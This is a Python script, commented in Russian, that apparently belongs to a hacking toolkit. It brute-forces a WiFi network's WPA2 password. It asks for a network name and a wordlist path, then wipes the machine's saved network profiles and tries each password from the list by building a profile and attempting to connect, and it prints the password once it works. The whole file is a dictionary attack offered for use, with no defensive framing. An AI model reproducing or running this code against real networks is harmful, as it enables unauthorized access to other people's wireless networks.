import pywifi #import
from pywifi import const # const - это некоторые константы, установленные wifi, например, код состояния соответствует 4, сбой равен 0 и т. д.
import time
from colorama import Fore
import os
import imports.own.will_go_to_start

profile = pywifi.Profile()

def crack(password):

    while True:
            "" "Взломать Wi-Fi" ""
            wifi = pywifi.PyWiFi () # Реализуем объект
            # Получите первую сетевую карту
            iface= wifi.interfaces()[0]
                 # Отключить подключение сетевой карты
            iface.disconnect()
            time.sleep(2)
    
                 # Удалить все файлы конфигурации Wi-Fi (что-то вроде запрета точкам доступа Wi-Fi запоминать нашу информацию об инициализации Lei Shiyu)
            iface.remove_all_network_profiles()
    
                 # Создайте новый файл конфигурации Wi-Fi, укажите файл, имя Wi-Fi, пароль, метод кодирования и другие параметры конфигурации
                 # const.IFACE_DISCONNECTED фактически равно 4, 4 означает, что соединение успешно
            if iface.status() == const.IFACE_DISCONNECTED: 

                profile.auth = const.AUTH_ALG_OPEN
                         # алгоритм шифрования Wi-Fi
                profile.akm.append(const.AKM_TYPE_WPA2PSK)
                profile.cipher = const.CIPHER_TYPE_CCMP
                         # пароль Wi-Fi
                profile.key = password #password здесь пароль, переданный read_password ()

                         # Добавить новый файл конфигурации Wi-Fi
                new_profile = iface.add_network_profile(profile)

                         # Подключить Wi-Fi

                try:
        
                    iface.connect(new_profile)

                except:

                    print(Fore.RED + "(!ERROR!) " + Fore.WHITE + "=" + Fore.GREEN + " (!Wifi name was not found!)\n" + Fore.WHITE)
                    imports.own.will_go_to_start.main()

                time.sleep(4)
                if iface.status() == const.IFACE_CONNECTED:
                    return True
                else:
                    return False
            else:
                         print("\nConnection was " + Fore.GREEN + "successful!" + Fore.WHITE)

def read_password():
                 "" "Прочитать пароль" ""
                 #print ("Start hack")

                 path = pathtxt # Путь к словарю

                 try:

                     with open (path, "r") as f: # Открыть файл словаря
                         while True:
                            try:
                                password = f.readline () # читать каждую строку файла
                                #if password == password:

                                

                                boolte = crack(password)
                                if boolte == True:
                                    print (Fore.GREEN + "Right password!: " + Fore.WHITE + password + "\n") # Если взлом прошел успешно, выходим из программы
                                    imports.own.will_go_to_start.main()

                                else:
                                       print (Fore.RED + "Bad pas: " + Fore.WHITE + password)
                                       #ferd = ferd
                                       #continue
                                       #read_password()
                                       continue
                            except:
                                #read_password()
                                continue

                 except:

                    print(Fore.RED + "\n(!ERROR!) " + Fore.WHITE + "=" + Fore.GREEN + " (!Txt file was not found!)\n" + Fore.WHITE)
                    imports.own.will_go_to_start.main()

def wifi_hack_start():

    print(" ")
    print(Fore.RED + "Write 'esc' (for exit)")
    ferd = input(Fore.YELLOW + "Enter wifi name: " + Fore.WHITE)
    if ferd.lower() == "esc":
        imports.own.will_go_to_start.main()
    try:
        
        profile.ssid = str(ferd)

    except:

        print(Fore.RED + "\n(!ERROR!) " + Fore.WHITE + "=" + Fore.GREEN + " (!Wifi name was not found!)\n" + Fore.WHITE)
        imports.own.will_go_to_start.main()

    ferdtxt = input(Fore.YELLOW + "Enter path to txt file: " + Fore.WHITE)
    if ferdtxt.lower() == "esc":
        imports.own.will_go_to_start.main()
    try:
        
        global pathtxt
        pathtxt = str(ferdtxt)

    except:

        print(Fore.RED + "\n(!ERROR!) " + Fore.WHITE + "=" + Fore.GREEN + " (!Txt file was not found!)\n" + Fore.WHITE)
        imports.own.will_go_to_start.main()

    read_password()
